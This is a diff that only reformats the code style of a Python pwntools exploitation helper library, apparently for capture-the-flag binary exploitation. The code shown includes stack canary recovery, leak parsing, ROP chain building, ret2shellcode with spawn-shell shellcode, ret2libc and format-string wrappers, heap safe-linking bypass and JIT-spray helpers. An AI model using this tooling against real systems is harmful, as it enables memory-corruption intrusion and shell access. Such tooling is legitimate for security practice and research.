@@ -1,4 +1,18 @@
-from pwn import context, cyclic, cyclic_find, unpack, log, asm, flat, rol, ror, shellcraft, ROP, pwnlib, Coredump
+from pwn import (
+    context,
+    cyclic,
+    cyclic_find,
+    unpack,
+    log,
+    asm,
+    flat,
+    rol,
+    ror,
+    shellcraft,
+    ROP,
+    pwnlib,
+    Coredump,
+)
 import pwn
 import re
 import math
@@ -22,10 +36,10 @@ class PwnContext:
             auxv = open(f"/proc/{self.io.proc.pid}/auxv", "rb").read()
             word = context.bytes
             for i in range(0, len(auxv), 2 * word):
-                a_type = u64(auxv[i:i + word])
-                a_val  = u64(auxv[i + word:i + 2 * word])
+                a_type = u64(auxv[i : i + word])
+                a_val = u64(auxv[i + word : i + 2 * word])
                 if a_type == 25:  # AT_RANDOM
-                    canary = u64(b'\x00' + self.io.proc.readmem(a_val + 1, 7))
+                    canary = u64(b"\x00" + self.io.proc.readmem(a_val + 1, 7))
                     break
             self._canary = canary
         return self._canary
@@ -65,7 +79,7 @@ class PwnContext:
     def resolve(self, symbol):
         if isinstance(symbol, int):
             return symbol
-        
+
         for b in (self.libc, self.elf):
             try:
                 addr = self.__find_sym(symbol, b)
@@ -75,8 +89,8 @@ class PwnContext:
                 continue
         return None
 
-    def leak(self, leak, leaked=0, name=''):
-        start = leak.find(b'0x')
+    def leak(self, leak, leaked=0, name=""):
+        start = leak.find(b"0x")
         base = 0
 
         if start >= 0:
@@ -93,18 +107,18 @@ class PwnContext:
             if len(leak) <= 8:
                 leak = upack(leak)
             else:
-                if leak[-1] == 0xa:
+                if leak[-1] == 0xA:
                     leak = leak[:-1]
 
                 for i in range(len(leak)):
                     for j in range(6, 8):
-                        l = upack(leak[i:i + j])
+                        l = upack(leak[i : i + j])
                         found_name, found_base = self.check_leaks(l)
                         if found_name:
-                            log.info(f'{found_name} found at leak[{i}:{i + j}]')
+                            log.info(f"{found_name} found at leak[{i}:{i + j}]")
                             break
                 else:
-                    log.warn('cannot find leak, try another way')
+                    log.warn("cannot find leak, try another way")
                     exit(0)
                 return
 
@@ -118,13 +132,15 @@ class PwnContext:
 
         var = getattr(self, name, False)
         if var:
-            if type(getattr(var, 'address', False)) is int:
+            if type(getattr(var, "address", False)) is int:
                 var.address = base
             else:
                 setattr(self, name, base)
 
         if base > 0 and leak != base:
-            log.info(f"{name}: leak = {leak:#x}, base = {base:#x}, diff = {leak - base}")
+            log.info(
+                f"{name}: leak = {leak:#x}, base = {base:#x}, diff = {leak - base}"
+            )
         elif name:
             log.info(f"{name}: leak = {leak:#x}")
         elif not self.io:
@@ -136,13 +152,13 @@ class PwnContext:
 
     def check_leaks(self, leak):
         base = 0
-        name = ''
+        name = ""
 
         if not self.io or not self.io.proc:
             return name, base
 
         if hex(leak) in hex(self.canary):
-            return 'canary', self.canary
+            return "canary", self.canary
 
         for m in self.io.proc.maps():
             if m.start <= leak <= m.end:
@@ -153,9 +169,9 @@ class PwnContext:
                     name = "libc"
                     base = self.io.proc.libc_mapping().address
                 else:
-                    name = m.path.strip('/')
-                    if hasattr(self.io.proc, f'{name}_mapping'):
-                        base = getattr(self.io.proc, f'{name}_mapping')().address
+                    name = m.path.strip("/")
+                    if hasattr(self.io.proc, f"{name}_mapping"):
+                        base = getattr(self.io.proc, f"{name}_mapping")().address
                 return name, base
 
         return name, base
@@ -175,8 +191,8 @@ class PwnContext:
             rop.raw(rop.ret.address)
 
         for func, params in chain.items():
-            if isinstance(func, str) and '+' in func:
-                f, off = func.split('+')
+            if isinstance(func, str) and "+" in func:
+                f, off = func.split("+")
                 func = self.resolve(f) + int(off)
             if not isinstance(params, dict):
                 rop.call(func, params)
@@ -213,7 +229,9 @@ class PwnContext:
         shellcode = asm(shellcraft.sh())
         stub = asm("sub esp, 0x1000") if context.bits == 32 else asm("sub rsp, 0x1000")
         shellcode = stub + shellcode
-        padding_len = self.offset - context.bytes * (self.elf.canary + 1) - len(shellcode)
+        padding_len = (
+            self.offset - context.bytes * (self.elf.canary + 1) - len(shellcode)
+        )
         padding = asm("nop") * padding_len
         addr += len(padding) // 2
         payload = self.ropchain({addr: []})
@@ -268,42 +286,46 @@ def _require_ctx():
 
 def _ctx(name):
     """Forward a method call to pwnctx."""
+
     def wrapper(*args, **kwargs):
         _require_ctx()
         return getattr(pwnctx, name)(*args, **kwargs)
+
     wrapper.__name__ = name
     return wrapper
 
 
 def _ctx_prop(name):
     """Forward a property access to pwnctx."""
+
     def wrapper():
         _require_ctx()
         return getattr(pwnctx, name)
+
     wrapper.__name__ = name
     return wrapper
 
 
-leak         = _ctx("leak")
-resolve      = _ctx("resolve")
-check_leaks  = _ctx("check_leaks")
-ropchain     = _ctx("ropchain")
-bof          = _ctx("bof")
-ret2shellcode= _ctx("ret2shellcode")
-ret2win      = _ctx("ret2win")
-ret2libc     = _ctx("ret2libc")
-ret2plt      = _ctx("ret2plt")
-format_string= _ctx("format_string")
-binsh        = _ctx("binsh")
+leak = _ctx("leak")
+resolve = _ctx("resolve")
+check_leaks = _ctx("check_leaks")
+ropchain = _ctx("ropchain")
+bof = _ctx("bof")
+ret2shellcode = _ctx("ret2shellcode")
+ret2win = _ctx("ret2win")
+ret2libc = _ctx("ret2libc")
+ret2plt = _ctx("ret2plt")
+format_string = _ctx("format_string")
+binsh = _ctx("binsh")
 
-offset       = _ctx_prop("offset")
-canary       = _ctx_prop("canary")
+offset = _ctx_prop("offset")
+canary = _ctx_prop("canary")
 
 
-u64   = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
-u32   = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
-u16   = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
-upack = lambda d: unpack(d.ljust(context.bits // 8, b'\x00'), context.bits)
+u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
+u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
+u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
+upack = lambda d: unpack(d.ljust(context.bits // 8, b"\x00"), context.bits)
 
 
 def getb(d, a, b):
@@ -313,7 +335,7 @@ def getb(d, a, b):
     b_ = d.find(b, a_ + len(a))
     if b_ == -1 or len(b) == 0:
         b_ = len(d)
-    return d[a_ + len(a):b_]
+    return d[a_ + len(a) : b_]
 
 
 def getr(d, p):
@@ -332,8 +354,8 @@ def safelink_bf64(ptr):
     for i in range(36, -1, -12):
         tmp = fd
         fd <<= 12
-        fd |= (tmp ^ (ptr >> i)) & 0xfff
-    if fd & 0xf != 0:
+        fd |= (tmp ^ (ptr >> i)) & 0xFFF
+    if fd & 0xF != 0:
         log.warn("safelink_bf64(): page differs")
     return fd
 
@@ -346,7 +368,7 @@ def printx(**kwargs):
 def hexdump(data, s=context.word_size // 8):
     idx_max = math.ceil(math.log(len(data), 16))
     for i in range(0, len(data), s):
-        log.info(f"%0{idx_max}x: %#0{2 * s + 2}x" % (i, u64(data[i:i + s])))
+        log.info(f"%0{idx_max}x: %#0{2 * s + 2}x" % (i, u64(data[i : i + s])))
 
 
 def safelink(addr, ptr):
@@ -380,7 +402,9 @@ def jitspray(code, size=8, jmp=b"\xeb\x03"):
     parts = [b""]
     for c in code:
         if len(c) > size:
-            log.error(f"jitspray(): code part {c.hex()} too long for maximum size {size}")
+            log.error(
+                f"jitspray(): code part {c.hex()} too long for maximum size {size}"
+            )
         p = parts[-1]
         if len(p) + len(c) > size:
             parts[-1] = p.ljust(size, b"\x90") + jmp
